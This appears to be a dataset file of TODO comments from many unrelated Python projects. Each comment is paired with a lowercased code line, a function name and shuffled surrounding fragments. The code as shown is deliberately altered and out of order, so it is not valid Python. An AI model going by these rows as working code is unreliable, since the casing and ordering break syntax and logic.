# todo: inplace of df with parent (reflection) </s> def _impl(df, level=none, drop=false, inplace=false,	_impl col_level=0, col_fill=''): return hpat.hiframes.pd_dataframe_ext.reset_index_dummy(df, inplace)
#todo remove str() -- http://github.com/fifengine/fifengine/issues/701 </s> self.play_ambient(str(soundfile), loop_interval=play_every,	_init_playing random.randint( * self.__class__.AMBIENT_SOUND_INTERVAL_VARIANCE ) for soundfile in self.soundfiles: position=self.instance.position.center)
# todo: remove </s> import pdb; pdb.set_trace()	error_handler if self.debug_error:
# todo: fix this workaround </s> @asyncio.coroutine	cursor @pytest.yield_fixture def cursor(connection, loop): def f(): cur = yield from connection.cursor()
# todo: add cntk </s> raise notimplementederror()	extract_conv2d_patches padding.upper()) else:
# todo: should we also remove the keys of the delegated roles? </s> tuf.roledb.remove_delegated_roles(metadata_role)	_update_metadata_if_changed if metadata_role == 'targets' or metadata_role.startswith('targets/'): logger.debug('Removing delegated roles of '+repr(metadata_role)+'.') self._import_delegations(metadata_role)
# todo: parallel processing! </s> return training_data	_process_training_data print()
# todo: store the random state and return it to its previous value </s> random.seed(random_seed)	create_random_bundles num_bundles, random_seed): num_scenarios = len(self._scenarios) sequence = list(xrange(num_scenarios))
# todo: windows debug_mode? </s> yield os.path.join(current_directory, "_wrapcl" + _get_c_extension_suffix())	_get_wrapcl_so_names import os.path current_directory = os.path.dirname(__file__) from distutils.sysconfig import get_config_var yield os.path.join(current_directory, "_wrapcl" + get_config_var('SO'))
# todo: https://github.com/giampaolo/psutil/issues/1035 </s> self.assertin(client_conn.laddr, ("", none))	test_unix self.assertEqual(server_conn.laddr, name) self.assertIn(server_conn.raddr, ("", None))
# todo: @sbharadwajj implement and test </s> raise notimplementederror	_bias_jac_mat_prod def _bias_jac_mat_prod(self, module, g_inp, g_out, mat):
# todo - send file in chunks if file size > some threshold. </s> headers = {'content-type': 'application/json',	_submit_sample } with open(fname, "rb") as sample: 'user_agent': user_agent, 'filename': basename(fname)}
# todo : now the logger.info will error if iter > 350000, so use print haha </s> if max_iteration > 350000:	main msg = ', '.join(['iter: {it}/{max_iteration}', 'lr: {lr:4f}', 'loss: {loss:.4f}', 'eta: {eta}', 'time: {time:.4f}', ]).format(it=it, max_iteration=max_iteration, lr=lr, loss=loss_avg, time=t_intv, eta=eta) logger.info(msg) else:
</c:comp-filter>"""], "todo", items=(1, 2, 9)) </s> assert "href>/calendar.ics/todo1.ics</" not in answer	test_time_range_filter_todos_rrule <C:time-range start="20140801T000000Z" end="20141001T000000Z"/> </C:comp-filter> assert "href>/calendar.ics/todo2.ics</" in answer assert "href>/calendar.ics/todo9.ics</" in answer
# todo remove in v8 </s> self.compile_html(source, dest, is_two_file)	compile def compile(self, source, dest, is_two_file=False, post=None, lang=None):
# todo: clean up </s> yield _pubsubs_fsub	pubsubs_fsub _pubsubs_fsub = _make_pubsubs(hosts, floodsubs, pubsub_cache_size)
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo: make this a hard error, instead of a silent overwrite </s> logging.warning("kvm: overriding disk_cache setting '%s' with 'none'"	_GenerateKVMRuntime if instance.disk_template in constants.DTS_EXT_MIRROR: if disk_cache != "none": " to prevent shared storage corruption on migration", disk_cache)
# todo(shilpasd): need to provide support in python - novaclient </s> "via either --os-auth-url or env[os_auth_url]."))	main _("You must provide an auth url "
# todo make atomic </s> graph = tx.graph	__db_merge__ def __db_merge__(self, tx, primary_label=None, primary_key=None): cog = self.__cog__ node = cog.subject_node
# todo: kkrampa, shouldn't we wait to save the checkpoint until after we've processed all the data? </s> save_stock_data_checkpoint(checkpoint,	sync_stock_transaction date__gte=date, order_by='date'))) 'stock_transaction', meta.get('limit') or limit,
# todo dry </s> try:	_expect except pexpect.TIMEOUT: pass pnum = self.con.expect('Indication   handle = .*? \r', timeout=.5) if pnum == 0:
# todo: assert </s> self.asserttrue(result)	test_remove_distro Test: remove a distro object result = self.remote.remove_distro("testdistro0", self.token) assert 0
# todo remove once project goes public </s> restrict = "org_group_admin",	menu_modules MM("Test Stations for Everybody", c = "org", f = "facility", m = "summary", vars={"$$code": "TESTS-PUBLIC"}, ), MM("Test Stations for School and Child Care Staff",
# todo: detect if any database upgrading is needed and acquire the lock only in one place </s> with manager.acquire_lock(event=false):	after_table_create from flexget.manager import manager if tables: tables = [table.name for table in tables] for plugin, info in plugin_schemas.iteritems():
# todo: formatting test names when non-string names are involved </s> print _formatheader("%s skipping %s, test(s) %s disabled" %	RunTestIf tstart = datetime.datetime.now() desc = _DescriptionOf(fn) (tstart, desc, testnames))
# todo: change the order of these arguments. </s> path = locator.find_name(self.search_dirs, name)	load_name search_dirs: the list of directories in which to search. locator = self._make_locator() return self.read(path)
#todo handle found multiple worksheets with name </s> raise e	get_bundle_uuid uuid = worksheet_util.get_bundle_uuid(client, worksheet_uuid, bundle_spec) except UsageError, e: return uuid
# todo: move this scopes conversion from and to string into a utils function </s> scopes = scopes.split(" ") if scopes else []	create_authorization_response if not allow: raise oauth2.AccessDeniedError() server = self.get_server(request) uri, headers, body, status = server.create_authorization_response(
# todo: remove anytime in 2016 </s> _assert(false, "got to form id even though this shouldn't be possible")	_get_key return [domain, parsed_params.status, parsed_params.app_id] elif parsed_params.most_granular_filter == 'xmlns': return [domain, parsed_params.status, parsed_params.app_id, parsed_params.get_module_int(), parsed_params.xmlns]
# todo: add documentation </s> if not torch.is_tensor(dst_homo_src) or not torch.is_tensor(points_src):	transform_points def transform_points(dst_homo_src, points_src): raise TypeError("Input type is not a torch.Tensor") if not dst_homo_src.device == points_src.device:
# todo: @sbharadwajj implement and test </s> return true	hessian_is_zero def hessian_is_zero(self):
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_tail pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
# todo: verify lldp message (e.g. org-specific authenticator tlv) </s> self.lldp_handler(now, pkt_meta, other_valves)	_non_vlan_rcv_packet if lacp_ofmsgs: return lacp_ofmsgs return []
# todo: remove in 21.08 </s> if cache_audio_dir is not none:	generate_cache_text cache_audio_dir (path): DEPRECATED path to store .wav files cache_text_file (file): file containing the sentences LOG.warning( "the cache_audio_dir argument is deprecated. ensure the directory "
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	refresh_security_group_rules def refresh_security_group_rules(self, security_group_id):
# todo: remove optional argument used for debugging </s> def system(request=none):	system model = SystemImporterFileCsvCronbasedConfigModel.objects.get(system_importer_file_csv_cronbased_config_name = 'SystemImporterFileCsvCronbasedConfig')
# todo(garyk) read base mac from configuration file (conf) </s> mac = [0xfa, 0x16, 0x3e, random.randint(0x00, 0x7f),	_generate_mac max_retries = 16 for i in range(max_retries): random.randint(0x00, 0xff), random.randint(0x00, 0xff)] mac_address = ':'.join(map(lambda x: "%02x" % x, mac))
pass # todo </s> def handle_request(self, input):	handle_request
# todo(mriedem): if we can parse the volume_image_metadata field from </s> self.openstack('server delete --wait ' + server_name)	test_server_boot_with_bdm_image cmd_output['status'], )
# todo: start here </s> for path in self._fs.ls(dir_path):	_archive_dir tar_gz_name = ( self._working_dir_mgr.name('dir', dir_path, name) + '.tar.gz') pass
# todo (ismailsunni): create custom exception to catch since it </s> pass	allowed_units result = add_to_list(result, categories['hazard']['units']) else: return result
# todo(nnorwitz): store the function_parameters. </s> token = self._getnexttoken()	_GetMethod modifiers = [p.name for p in parameters] function_parameters = list(self._GetMatchingChar('(', ')')) assert token.token_type == tokenize.SYNTAX, token assert token.name == ';', token
# todo: createpropertyconditionex with propertyconditionflags_ignorecase </s> new_cond = _iuia.createpropertycondition(	_build_condition full_cond = _iuia.CreateAndCondition(new_cond, full_cond) if title: _UIA_dll.UIA_NamePropertyId, title) full_cond = _iuia.CreateAndCondition(new_cond, full_cond)
# todo: find path properly </s> return	loadNextFileInPlaylist self.ui.showErrorMessage(u"Could not find file {} for playlist switch!".format(filename))
#change status of todo </s> todo.status = 'closed'	test_notification_to_assignee notification.send_to_all_assignees = 1 notification.save() todo.save() email_queue = frappe.get_doc('Email Queue', {'reference_doctype': 'ToDo',
# todo: change this back to a factory in the instance trait some day </s> self.tick_generator = defaulttickgenerator()	__init__ def __init__(self, *args, **kwargs): super(PlotAxis, self).__init__(**kwargs)
@domain_admin_required # todo: will probably want less restrictive permission </s> def locations_list(request, domain):	locations_list context = { 'domain': domain,
"""@todo add progressbar for multisite. ensure the other one is hidden first.""" </s> try:	test_progressbar_url_file_hidden_in_ennumerate @patch('common.ProgressBar.set') def test_progressbar_url_file_hidden_in_ennumerate(self, p): self.scanner.enumerate_plugins(self.base_url, self.scanner.plugins_base_url, hide_progressbar=True)
assert study_id == 0  # todo </s> self.trials[trial_id].state = state	set_trial_state def set_trial_state(self, study_id, trial_id, state):
#todo(mdietz): apply the rest of the instance_type attributes going </s> self.db.instance_update(context, instance_ref,	resize_instance self.db.migration_update(context, migration_id, {'status': 'post-migrating', }) dict(memory_mb=instance_type['memory_mb'], vcpus=instance_type['vcpus'],
""" todo: documentation </s> try:	_execute def _execute(self, operation, reader, writer): for record in operation(self, SearchCommand.records(reader)): writer.writerow(record)
# todo: move this into removedirectory maybe. doing an external </s> if os.name == "nt":	compareWithCPython os.unlink("@test") except OSError: os.system("rmdir /S /Q @test") if os.path.exists("@test"):
# todo: fix with stubber / before send event </s> return original_send(self, *args, **kwargs)	mock_endpoint_send else:
# todo is the processor the correct place to set this? </s> keras.backend.set_image_dim_ordering('th')	ThreePlaneProcessor consolidate=consolidate, use_generator=use_generator) def feature_and_label(self, color, move, go_board, num_planes): Parameters
#todo fifechan / fife 0.3.5+ compat </s> self._setting._loadsettingsdialog = self._setting.loadsettingsdialog	setup_setting_extras slider_event_map = {} if not hasattr(self.engine._setting, '_loadSettingsDialog'): self.settings_dialog = self._setting._loadSettingsDialog() slider_dict = {'AutosaveInterval': 'autosaveinterval',
# through a failure or not. todo </s> crr.repair_successful = false	_repair_error def _repair_error(f): crr.repair_failure = f return f
# todo: cleanup directory/basename.* files. </s> tmp = tempfile.namedtemporaryfile(	commit def commit(self): directory, basename = os.path.split(self._json_file) prefix=basename + '.', dir=directory, delete=False) try:
# todo: improve exception handling </s> particle = particle(argument, mass_numb=mass_numb, z=z)	ion_symbol Z: int = None) -> str: r"""Returns the ion symbol.""" if particle.ion: return particle.ion
# todo deal with errors! </s> backend = backend.objects.get(name=backend_name)	contact_bulk_add contact = Contact(name=name) contact.save() connection = Connection(backend=backend, identity=identity, contact=contact)
#todo: multiple replication tasks </s> break	SnapshotResource if remotename in snaps: bundle.data['replication'] = 'OK' return bundle
#todo: in some cases we can have something like: a=os.path </s> type_value = value.__class__	_process_function defaults = [] for value in symbol.args.defaults: data_type = self.__mapping.get(type_value, None) defaults.append((data_type, type_value))
# todo: add docstring </s> if not isctime(sysc):	sample_system def sample_system(sysc, Ts, method='matched'): raise ValueError("First argument must be continuous time system") if (sysc.inputs != 1 or sysc.outputs != 1):
# todo: improve the complexity of this algorithm </s> for queueid, queue in node_state.queueids_to_queues.items():	handle_delivered def handle_delivered(node_state, state_change): if queueid[1] == 'global': remove = []
raise exceptions.mpdnotimplemented  # todo </s> accomplished by any command that starts playback).	clearerror Clears the current error message in status (this is also
# todo: we do another lookup in cast_param, refactor to reduce number of lookups </s> action_ref = action_node.ref	run } break action_db = action_db_util.get_action_by_ref(ref=action_ref) if not action_db:
# todo: add error handling for windowserror, a builtin </s> try:	_GuessOS def _GuessOS(self, col_obj): if col_obj.FindPath('/(Windows|WINNT)/System32'): return 'Windows'
# todo (1.5.1) - have another try at simplifying all this... </s> links = req.chrome.get('links')	_render_jinja_template template, data = self.prepare_template(req, filename, data, text, domain) scripts = req.chrome.get('scripts') script_data = req.chrome.get('script_data')
# todo: add logging to the process </s> if isinstance(dialect, six.text_type):	pgexport ): Required: psql command dialect = csv.get_dialect(dialect) command = get_psql_copy_command(
# todo: should be able to specify fields </s> if dialect is none:  # get a sample to detect dialect	csv2sqlite force_types=None, chunk_size=8388608, table_name='table1'): 'Export a CSV file to SQLite, based on field type detection from samples' fobj = open_compressed(input_filename, mode='rb') sample = fobj.read(chunk_size)
# todo add locales </s> raise yunohosterror("bad_value_type", value_type=type(owned_dns_zone))	domain_set_settings owned_dns_zone = owned_dns_zone in ["True", "true", "1"] except: domains[domain]["owned_dns_zone"] = owned_dns_zone setting_set = True
encrypting_key = bytes.fromhex(encrypting_key)  # todo: move / validate </s> new_card = card(character_flag=character_flag,	contacts if not encrypting_key: encrypting_key = click.prompt('Enter Encrypting Key', type=click.STRING) verifying_key=verifying_key, encrypting_key=encrypting_key,
# todo: would like to make this a name that a user can re-name. </s> ctx.out_keyword('$var%d' % (op.value))	notify_out_operand return True elif wtype == WASM_LOCAL: return True elif wtype == WASM_FUNC_INDEX:
#only checking length. this should check functionality as well (todo) and/or import that information from the sram </s> debug.check(len(self.sram.pins) == len(self.pin_names), "number of pins generated for characterization do match pins of sram")	create_pin_names self.pin_names.append("{0}".format(tech.spice["vdd_name"])) self.pin_names.append("{0}".format(tech.spice["gnd_name"]))
#todo now the content must be in cache! (got to handle transfer error) </s> path = os.path.expanduser(os.path.join('~', '.config',	_get_msn_object_path self.cbs = (self._download_background, self._download_background) self.msn_object_store.request(msn_object, self.cbs) 'emesene2', self.session.account.account, msn_object._checksum_sha + ".jpg"))
# todo: follow-up actions for downtime </s> return	_do_work if not self.__check_work_requirement(): self.log.warn(f'CONFIRMATION PREVENTED - There are unmet confirmation requirements.') self.log.info("Confirmed activity for period {}".format(self.current_period)) transacting_power = self.worker.transacting_power
# todo ... </s> print "finalize", self, "at", statestruct.curposasstr()	finalize def finalize(self, stateStruct):
# todo hack! include image digest and status, needed for the downstream notifications handler </s> last_evaluation_result['image_digest'] = imagedigest	perform_policy_evaluation last_evaluation_result = obj_store.get_document(userId, 'policy_evaluations', last_evaluation_record['evalId']) last_final_action = last_evaluation_result['final_action'].upper() if last_final_action in ['GO', 'WARN']: last_evaluation_result['status'] = 'pass'
# todo: would need to either avoid this "decorator" approach for </s> toppath_ = os.path.join(os.path.dirname(__file__), 'testrepos') \	with_testrepos @wraps(t) def newfunc(*arg, **kw): if toppath is None else toppath globs = glob.glob(os.path.join(toppath_, paths))
# todo manage tangent? </s> translation_keyframe = conversion.loc_gltf_to_blender(values[idx * 3 + 1])	parse_translation_channel for idx, key in enumerate(keys): if animation.samplers[channel.sampler].interpolation == "CUBICSPLINE": else: translation_keyframe = Conversion.loc_gltf_to_blender(values[idx])
# todo: implement me! </s> return self	fit warnings.warn('Objective did not converge, you might want' 'to increase the number of interations')
# todo: take _buffercount into account </s> args = ql.os.utils.va_list(format, arglist)	hook___stdio_common_vsprintf format = params['_Format'] arglist = params['_ArgList'] count = ql.os.utils.sprintf(buff, format, args, wstring=False) ql.os.utils.update_ellipsis(params, args)
# todo: perhaps next loop could be made more efficient </s> c = b[l2:l]	solve term2 = R(a[:L], check=False) product = (term1 * term2).list() for j in range(L2 - 1, min(L-1, len(product))): c[j - (L2-1)] = c[j - (L2-1)] + product[j]
# todo if this is going into production (hopefully it isn't) then check </s> cptp, expand to arbitrary dimensional systems, etc.	_dep_super Returns the superoperator corresponding to qubit depolarization for a given parameter pe. return Qobj(dims=[[2, 2], [2, 2]], inpt=array([[1. - pe / 2., 0., 0., pe / 2.],
# todo pseudo code: </s> pass	OpenUri @dbus.service.method(dbus_interface=player_interface) def OpenUri(self, uri):
# todo(b/160294509): use tf.compat.v1 when we stop supporting tf 1.15. </s> if ops.executing_eagerly_outside_functions():	call def call(self, inputs): return self._saved_model_loader.apply_v1_transform_model_in_v2(inputs) else:
# todo specify custom/caching document loader in options to speed </s> return jsonld.flatten(obj, ctx={"@context": "http://schema.org/"})	_postproc_jsonld lgr.debug('pyld not available, not compacting meta data graph') return obj
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_convert = p_operation.add_parser( "convert", help="convert VGM to PCM using OPL hardware")
# todo: try to find a better way to deal with local execution </s> if self.is_method and not self.locations and self.owner == sy.hook.local_worker:	_execute_readable_plan def _execute_readable_plan(self, *args): result_ids = [sy.ID_PROVIDER.pop()] self._self.send(sy.hook.local_worker, force_send=True) plan_res = self.execute_plan(args, result_ids)
# @todo: this part takes most of the time. need a better solution. </s> def pix(pixel, _resultats={}, b=pack):	pix This method uses of memoization. if pixel not in _resultats:
# todo handle pgp_expiration_alert and pgp_expiration_notice already included in client/app/data/txt </s> store.add(notification)	initialize_node if k in appdata['templates']: setattr(notification, k, appdata['templates'][k])
# todo: try to unify user-input collection (both for registers and this kind of </s> 'user_input': state.user_input,	new_vi_cmd_data 'follow_up_mode': None, 'is_digraph_start': False, '__reorient_caret': False, 'is_jump': False,
# todo: adjust dimension order for tf2 broadcasting </s> p_safe = tf.compat.v1.where(	_compute_2d_sparsemax p = tf.math.maximum( tf.cast(0, logits.dtype), z - tf.expand_dims(tau_z, -1)) tf.math.logical_or( tf.math.equal(k_z, 0), tf.math.is_nan(z_cumsum[:, -1])),
# todo username </s> return 'aqbwdj5qap6lhhaaskvbnukyhj7eyremko5qka=='	get_monitor_secret def get_monitor_secret():
# todo(rosmaita): simplify when lower_constraints has webob >= 1.8.1 </s> try:	test_best_match_language_unknown accepted = 'unknown-lang' request.headers = {'Accept-Language': accepted} from webob.acceptparse import AcceptLanguageValidHeader  # noqa cls = webob.acceptparse.AcceptLanguageValidHeader
# todo: clean this up </s> owner = discord.utils.find(lambda m: m.id == self.config.owner_id and m.voice_channel, self.get_all_members())	MusicBot player.play() if self.config.auto_playlist: await self.on_finished_playing(await self.get_player(owner.voice_channel)) @ignore_non_voice
pass  # todo </s> def _value_type_choice(self, value):	_value_type_choice
# todo: add more sell close test </s> assert len(orders) == 0	handle_bar def handle_bar(context, bar_dict): orders = sell_close(context.f1, 1)
# todo : not sure if this is the best check here. </s> if isinstance(type(k), undefinedfunction):	evaluate_ode specified_values = np.zeros(len(specified)) for k, v in args['specified'].items(): k = (k,) idx = [specified.index(symmy) for symmy in k]
# todo(b/175815580) update logic based resolution of the issue. </s> logging.info("detected running in dlvm environment.")	get_client_environment_name logging.info("Detected running in HOSTED_NOTEBOOK environment.") return ClientEnvironment.HOSTED_NOTEBOOK.name return ClientEnvironment.DLVM.name if "google" in sys.modules:
# todo: logs might contain sensitive data such as contents of the </s> le_util.make_or_verify_dir(args.logs_dir, 0o700, os.geteuid())	main2 le_util.make_or_verify_dir( directory, constants.CONFIG_DIRS_MODE, os.geteuid()) _setup_logging(args) logger.debug("Arguments: %r", cli_args)
# todo: add here additional variants for other reprog_controls </s> if self.keys[index] is none:	__getitem__ if index < 0 or index >= len(self.keys): raise IndexError(index) keydata = feature_request(self.device, FEATURE.REPROG_CONTROLS, 0x10, index) self.keyversion=1
buildlog = f.read() #todo: this may not return all output </s> output.addtest(bid, package.installed, buildlogpath + '\n' +	createTestOutput buildLogPath = join_path(package.stage.source_path, 'spack-build.out') with open(buildLogPath, 'rb') as F: spec.to_yaml() + buildLog) return handled[spec]
# todo: don't write them? is *much* slower on re-load (~3x) </s> try:	update_module fh.flush() os.fsync(fh.fileno())  # flush to disk os.unlink(self.module_path + 'c') except OSError:
percentiles_to_calculate = range(0, 101, 1)  # todo: get input from user </s> headers = constants.submetric_header + ',mean,std,p50,p75,p90,p95,p99,min,max\n'  # todo: this will be built from user input later on	calculate_other_metric_stats def calculate_other_metric_stats(self): stats_to_calculate = ['mean', 'std', 'min', 'max']  # TODO: get input from user metric_stats_csv_file = self.get_stats_csv() imp_metric_stats_csv_file = self.get_important_sub_metrics_csv()
# todo: change this to be architecture independent </s> raise runtimeerror("could not retrieve processor type: %s" %ex)	get_proc_type except Exception as ex:
# todo: remove this patching when the `content` property is supported. </s> with monkeypatch_validation(validate_content):	test_default_stylesheet @suite.test def test_default_stylesheet(): document = parse_html('doc1.html') head_style = document.style_for(document.dom.head)
# todo: rethink factorization? </s> windowcontroller = self._nsobject.window().windowcontroller()	refitFontItems self.setPosSize((x, y, w, h)) if anyFontsToLoad: windowController.loadFonts()
# todo, using publicsuffix instead of this rewrite rule </s> old_result_domainname = '.'.join(result['parsed_url'].hostname.split('.')[-2:])	index if result['url'] == new_result_url: continue new_result_domainname = '.'.join(new_parsed_url.hostname.split('.')[-2:]) if old_result_domainname == new_result_domainname:
# todo dunno maybe use the same mypy config in repository? </s> env = {**os.environ}	run_mypy from my.core.init import get_mycfg_dir mycfg_dir = get_mycfg_dir() mpath = env.get('MYPYPATH') mpath = str(mycfg_dir) + ('' if mpath is None else f':{mpath}')
# todo(brett.cannon) implement </s> pass	test_implicit_hooks def test_implicit_hooks(self):
self.my_sender('text/cache-manifest', bytes(manifest, 'utf-8')) # todo: cache-control/last-modified headers </s> manifest += '\n# hash: {}'.format(hasher.hexdigest().upper())	theme_manifest manifest += 'prefer-online\n'
# todo: remove this </s> logger.warning((	windows_directory def windows_directory(*args, **kwargs): 'Use of `windows_files.windows_directory` is deprecated, ' 'please use `windows_files.directory` instead.'
# todo: check for stable/prerelease/current/beta if we support </s> self.lgr.info(	update_fetch self.release)] new_root = "{}/releases/{}/root".format(self.iocroot, self.release) "\n* Updating {} to the latest patch level... ".format( self.release))
# todo: remove: legacy function </s> return sorted(	get_lowest_content_category def get_lowest_content_category(): [ (cat.published_product_count, cat)
# todo: boto3 call can fail with botocore.exceptions.clienterror, </s> response = self.r53client.change_resource_record_sets(	create_elb_dns for zone_id in zone_ids: self.log.debug('zone_id: %s', zone_id) HostedZoneId=zone_id, ChangeBatch=json.loads(dns_json), )
# todo 更新用户model后替换 </s> from app.lin.core import user	select_ids_by_user_id def select_ids_by_user_id(cls, user_id) -> list: 根据用户ID，通过User-Group关联表，获取所属用户组的Id列表 from .user_group import UserGroup query = db.session.query(UserGroup.group_id).join(
# todo: remove in 21.08 </s> if cache_audio_dir is not none:	generate_cache_text cache_audio_dir (path): DEPRECATED path to store .wav files cache_text_file (file): file containing the sentences LOG.warning( "the cache_audio_dir argument is deprecated. ensure the directory "
""" type setting - todo explain """ </s> return discovery['changeset']	get_changeset def get_changeset(self,obj):
pass # todo </s> def handle_request(self, input):	handle_request
# todo: query the locations </s> pass	match_district def match_district(xlsx_district_name): Given district name taken from the spreadsheet, return the id name and id of the matching location in HQ.
# todo: test me @jmcarp </s> if to_retain != users:	manage_contributors 'Must have at least one registered admin contributor' ) self.add_log( action=NodeLog.CONTRIB_REORDERED,
# todo(b/163904067): mimic defun' behavior and reset the step seed to </s> resetstepseed()	Backward def Backward(*args): if bak_as_function: xs_len = len(Flatten(fwd_sig_no_captures)) ys_len = len(Flatten(sigs.rets))
common_path=prefix,  # todo: add key? </s> action="local",	make_inline_attachments_decision ld = local_diff[k] md = MergeDecision( conflict=False, local_diff=[ld],
# todo: work out a way to set this based on the timespan of the data. </s> locator = mdates.autodatelocator(minticks=5, maxticks=25)	plot axes[i].locator_params(axis='y', nbins=6) axes[i].set_ylabel(f"{name} \n (W/m**2)", fontsize=9.5) formatter = mdates.ConciseDateFormatter(locator) axes[-1].xaxis.set_major_locator(locator)
# todo fix bug for not identifying unused variables in nested exceptions see issue #4391 </s> try:	func 1 / 0 except ZeroDivisionError as error: 1 / 0 except error:
# todo: implement this </s> class opts(object):	Opts def __init__(s): s.format_map = self.FORMATS
"""todo: not implemented""" </s> notimplementederror("prs welcome")	percent_rank @symbolic_dispatch def percent_rank(x):
self.__parameters.update(parameters)  # todo test </s> def set_params(self, **parameters):	set_params
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_compatible_types Request contains values that can be converted to the expected types.
else:  # todo: localization </s> self.__speak("this device is not connected to the internet")	transcribe else: raise sr.UnknownValueError
# todo: should this move to case.rebuild? </s> if not case.xform_ids:	rebuild_case case.rebuild(strict=False, xforms={f._id: f for f in sorted_forms}) case.xform_ids = case.xform_ids + [f._id for f in sorted_forms if f._id not in case.xform_ids] if not found: return None
elif key_type == unicode:  # todo: change to 'str' on python3 </s> field_index = self.field_names.index(key)	__delitem__ if key_type == int: del self._rows[key] del self.fields[key] self.Row = namedtuple('Row', self.field_names)
# todo implement. </s> yaml = self.master_model.to_yaml()	_train def _train(self, rdd, nb_epoch, batch_size, verbose, validation_split):
raise glomerror(msg)  # todo: dedicated exception type for this? </s> return self.iterate(target)	iter_func if path is not None: msg += ' (at %r)' % Path(*path)
# todo: set fileinfo to a valid object. </s> self.assertraises(tuf.repositoryerror, _update_metadata, 'targets', none)	test_3__update_metadata _update_metadata = self.Repository._update_metadata self._mock_download_url_to_tempfileobj(self.release_filepath) self._mock_download_url_to_tempfileobj(self.targets_filepath) _update_metadata('targets', None)
#@todo: remove in 0.4.10 </s> def getconfig(self, option, default=''):	getConfig try: return self.getConf(option)
# todo implement this method </s> :return:	send_event :param event: the event to be sent
return 0.25  # todo: make configurable and/or account for as many factors as we can </s> def get_correction_ppm(self):	OsmoSDRSource self._update_frequency() def get_tune_delay(slf): return self.correction_ppm def set_correction_ppm(self, value):
#todo could use original filename to verify this </s> assert_true(filename.endswith('.mp3'))  # depends on specific file	download_song_mm def download_song_mm(self): filename, audio = self.mm.download_song(self.song.sid) assert_is_not_none(audio)
annot.annotation_metadata.annotator.email = "todo"  # todo </s> annot.annotation_metadata.annotator.name = name	fill_annoatation_metadata annot.annotation_metadata.origin = "Cerulean Mountain Trust"
#todo: this can probably just be removed now? </s> return self.none	getattr_gi def getattr_gi(self, inst, key): try: if inst.get_data(key) is None:
# todo add index kwarg and move the playlist if it is specified </s> if isinstance(playlist, spotify.link):	add_playlist Returns the added playlist, or :class:`None` if the playlist already existed in the container. link = playlist elif isinstance(playlist, spotify.Playlist):
# todo: where else is this a problem? </s> for rnn_type in ['grufused', 'lstmfused']:	whitelist_rnn_cells try_caching=True, verbose=verbose) if has_old_rnns(): mod = getattr(torch.nn._functions.thnn.rnnFusedPointwise, rnn_type) wrap.disable_casts(mod, 'backward', handle)
# todo: unfortunately, this feature is not yet implemented for python </s> pass	test_tls_require_encryption def test_tls_require_encryption(self):
#todo: read from file or generate... needs to be correlated with hive </s> return {'pop3':	get_targets def get_targets(self): {'server': '127.0.0.1', 'port': 2100,
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: finish this. </s> **kwargs)	create_file data_filepath,
# todo: what if service nesting depth is more than max python stack depth? </s> for childservicejob in servicejob.service._childservices:	processService if depth == len(jobGraph.services): jobGraph.services.append([]) processService(childServiceJob, depth+1) serviceJobGraph = serviceJob._createEmptyJobGraphForJob(jobStore, predecessorNumber=1)
# todo: query stored contract and reconstitute </s> contract_details = self._contracts[hrac]	set_policy alices_signature, policy_payload = BytestringSplitter(Signature)(cleartext, return_remainder=True) kfrag = policy_payload_splitter(policy_payload)[0]  # TODO: If we're not adding anything else in the payload, stop using the splitter here. stored_alice_pubkey_sig = contract_details.pop("alice_pubkey_sig") if stored_alice_pubkey_sig != alice_pubkey_sig:
# todo: verify lldp message (e.g. org-specific authenticator tlv) </s> return ofmsgs	rcv_packet self.logger.info('LLDP from port %u: %s' % ( pkt_meta.port.number, pkt_meta.pkt)) ban_rules = self.host_manager.ban_rules(pkt_meta) if ban_rules:
# todo: separate tpu case from here </s> self._clip_gradients(optimizer)	clip_gradients if self.trainer.amp_backend == AMPType.NATIVE: self.trainer.scaler.unscale_(optimizer)
# todo(b/163904067): mimic defun' behavior and reset the step seed to </s> resetstepseed()	Forward @tf.function(input_signature=Flatten(fwd_sig), autograph=False) def Forward(*args): with RemoveAssertContext(remove=noinline), tf.device(device): xs = Pack(fwd_sig, args)
#opusenc invokation (todo: ffmpeg?) </s> opus_convert_call = 'opusenc "' + fname + '" "' + fbase + '.opus"'	main use_opus = False if use_opus: print("converting... : " + opus_convert_call) system(opus_convert_call)
# here fixme todo </s> truestop -= 1	array if entrystop != self.numentries: basket = self.basket(basketstop - 1, interpretation=interpretation, entrystart=entrystart, entrystop=entrystop, basketcache=basketcache) if executor is None: for i in range(truestop - truestart):
pass # todo </s> def _check_repair_results(rres):	_check_repair_results
# todo - probably delete </s> if hasattr(self, "app_label"):	set_admin2_base def set_admin2_base(self): return None self.app_label = self.kwargs.get('app_label')
# todo data alignment stuff </s> if 'byteoffset' in pyaccessor.json.keys():	read fmt = '<' + (fmt_char * component_nb) stride = struct.calcsize(fmt) offset = pyaccessor.json['byteOffset'] #TODO use pyaccessor.byteOffset else:
#todo : stop properly the module </s> print "[mysqldb] module raise an exception : %s . please check the arguments!" % exp	connect_database self.db_cursor.execute('SET character_set_connection=%s;' % self.character_set) except _mysql_exceptions.OperationalError as exp:
# todo(stevemar): assert returned fields </s> self.openstack('container save ' + self.container_name)	test_container_save def test_container_save(self):
# todo this is a workaround since exceptions are currently not correctly stacked </s> pass	findall return matchlist except RuntimeError: return self.__compile_cpython_sre().findall(string, pos, maxsize() if endpos == -1 else endpos)
# todo: raise a specific exception </s> assert sep is none or sep in settings.sep_chars	new @param digits: number of digits for the new document @raise DoorstopError: if the document already exists config = os.path.join(path, Document.CONFIG) if os.path.exists(config):
#todo: assert that layer inputs are always >= 0 </s> def __init__(self, model, *args, **kwargs):	LRPZPlus class LRPZPlus(LRPAlpha1Beta0IgnoreBias): super(LRPZPlus, self).__init__(model, *args, **kwargs)
# todo(mfedosin): think of a way to avoid this. </s> if self._is_conditional_transition(t_ex, task_spec) and \	_possible_route return True, depth not hasattr(t_ex, "in_context"): t_ex = db_api.get_task_execution(t_ex.id)
